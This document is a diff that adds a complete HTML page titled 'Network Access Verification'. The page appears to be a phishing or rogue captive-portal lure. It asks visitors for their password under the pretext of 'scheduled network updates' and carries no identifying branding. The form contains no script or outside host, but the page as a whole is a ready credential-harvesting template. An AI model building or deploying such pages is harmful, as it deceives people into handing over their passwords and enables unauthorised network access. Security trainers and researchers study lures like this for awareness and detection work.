@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Network Access Verification</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+
+  * {
+    box-sizing: border-box;
+  }
+
+  body {
+    margin: 0;
+    font-family: 'Roboto', sans-serif;
+    background: linear-gradient(135deg, #4a90e2, #50c9ce);
+    color: #333;
+    height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+
+  .container {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+
+  .login-box {
+    background: #ffffffdd;
+    border-radius: 12px;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+    width: 360px;
+    max-width: 100%;
+    padding: 32px 28px;
+    display: flex;
+    flex-direction: column;
+  }
+
+  .message {
+    font-size: 1.1rem;
+    font-weight: 500;
+    color: #1a1a1a;
+    margin-bottom: 28px;
+    border-left: 4px solid #4a90e2;
+    padding-left: 12px;
+  }
+
+  label {
+    font-weight: 600;
+    margin-bottom: 6px;
+    display: block;
+    color: #222;
+  }
+
+  input[type="password"] {
+    width: 100%;
+    padding: 12px 14px;
+    font-size: 1rem;
+    border: 2px solid #ccc;
+    border-radius: 6px;
+    transition: border-color 0.25s ease;
+  }
+
+  input[type="password"]:focus {
+    border-color: #4a90e2;
+    outline: none;
+  }
+
+  button {
+    margin-top: 24px;
+    background-color: #4a90e2;
+    color: white;
+    border: none;
+    padding: 14px 0;
+    font-size: 1.1rem;
+    font-weight: 700;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+
+  button:hover {
+    background-color: #3a78c2;
+  }
+
+  footer {
+    background: #002f5f;
+    color: #ccc;
+    text-align: center;
+    padding: 14px 0;
+    font-size: 0.9rem;
+    user-select: none;
+  }
+
+  @media (max-width: 400px) {
+    .login-box {
+      width: 100%;
+      padding: 24px 16px;
+    }
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <form class="login-box" action="#" method="POST" autocomplete="off" novalidate>
+      <div class="message">
+        Please verify your credentials to complete scheduled network updates.
+      </div>
+
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" required autocomplete="current-password" />
+
+      <button type="submit">Continue</button>
+    </form>
+  </div>
+  <footer>© 2025 Private Network Access.</footer>
+</body>
+</html>
